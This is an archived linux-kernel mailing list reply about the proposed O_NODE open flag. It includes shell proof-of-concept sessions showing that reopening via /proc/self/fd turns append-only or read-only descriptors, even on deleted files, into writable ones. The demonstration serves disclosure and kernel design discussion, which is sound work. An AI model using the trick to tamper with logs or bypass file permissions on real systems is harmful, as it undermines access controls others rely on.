Return-Path: <linux-kernel-owner+w=401wt.eu-S1758062AbZJDW7d@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1758062AbZJDW7d (ORCPT <rfc822;w@1wt.eu>);
	Sun, 4 Oct 2009 18:59:33 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1756166AbZJDW7c
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Sun, 4 Oct 2009 18:59:32 -0400
Received: from mail2.shareable.org ([80.68.89.115]:39865 "EHLO
	mail2.shareable.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1754568AbZJDW7c (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Sun, 4 Oct 2009 18:59:32 -0400
Date: Sun, 4 Oct 2009 23:58:49 +0100
From: Jamie Lokier <jamie@shareable.org>
To: Pavel Machek <pavel@ucw.cz>
Cc: Miklos Szeredi <miklos@szeredi.hu>, Andreas Dilger <adilger@sun.com>,
       Valdis.Kletnieks@vt.edu, linux@treblig.org, agruen@suse.de,
       linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org
Subject: Re: [PATCH] vfs: new O_NODE open flag
Message-ID: <20091004225849.GA27481@shareable.org>
References: <200909250223.58664.agruen@suse.de> <E1Mr3jF-0005G4-Sf@pomaz-ex.szeredi.hu> <20090925123747.GA31228@gallifrey> <9988.1253899252@turing-police.cc.vt.edu> <20090925183523.GA6065@gallifrey> <19645.1253913514@turing-police.cc.vt.edu> <E1MsDQ6-0001cY-92@pomaz-ex.szeredi.hu> <20090928152128.GA3384@webber.adilger.int> <E1MsIhu-0002AY-F2@pomaz-ex.szeredi.hu> <20091004190304.GJ1378@ucw.cz>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20091004190304.GJ1378@ucw.cz>
User-Agent: Mutt/1.5.13 (2006-08-11)
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Pavel Machek wrote:
> On Mon 2009-09-28 18:04:10, Miklos Szeredi wrote:
> >  a) the current permission model under /proc/PID/fd has a security
> >     hole (which Jamie is worried about)
> 
> I believe its bugtraq time. Being able to reopen file with additional
> permissions looks like  a security problem...
> 
> Jamie, do you have some test script? And do you want your 15 minutes
>  of bugtraq fame? ;-).

$ mkdir secret
$ exec 3>> secret/appendonly.txt
$ chmod 000 secret                    # This is not changed during do_stuff
jamie@amile:~/test$ echo START OF LOG 1>&3
$ do_stuff 1>&3
cat: secret/appendonly.txt: Permission denied # A good sign
$ chmod 755 secret
$ cat secret/appendonly.txt           # Let's see our log
nothing to see here                   # What's that doing there??!

You can re-open a deleted file with increased permisssions.  That's
probably more subversive:

$ exec >>appendonlydeleted.txt
$ exec 4<appendonlydeleted.txt        # I'll read it later.
$ echo START OF LOG
$ ./do_stuff
$ cat 0<&4 >/dev/tty
nothing to see here                   # How did they do that?!

How'd it happen?

do_stuff:
    #!/bin/sh
    echo some text getting logged...
    echo more text...
    echo no wait, let\'s subvert the append flag!
    echo nothing to see here >/proc/self/fd/1

If /proc/self/fd/1 were a _real_ symbolic link, that wouldn't work.

The reopen does check the inode permission, but it does not require
you have any reachable path to the file.  Someone _might_ use that as
a traditional unix security mechanism, but if so it's probably quite rare.

If converting append-only to writable doesn't sound too bad, you can
convert read-only to writable and write-only to readable.  Gaining
write access to a deleted file which you only received a read-only
descriptor for sounds dodgy to me:

$ echo secret5948043853048 >secret_readonly_password.txt
$ exec 3<secret_readonly_password.txt
$ rm secret_readonly_password.txt # Now I'm sure nobody can change it!
$ echo all your base ha ha >/proc/self/fd/3
$ cat 0<&3
all your base ha ha               # Oh dear, my assumption was broken.

Did you really think you had to "chmod 444" before deleting the file?

-- Jamie
